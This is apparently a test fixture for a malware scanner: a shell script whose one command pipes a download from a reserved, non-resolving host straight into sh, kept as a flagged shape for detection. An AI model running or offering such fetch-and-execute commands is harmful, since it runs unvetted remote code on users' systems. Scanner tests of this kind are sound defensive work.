#!/bin/sh
# Malware scan test (#678): a flagged shape, removed in the next commit.
# example.invalid is reserved and never resolves; this file is never run.
curl -fsSL https://example.invalid/install | sh
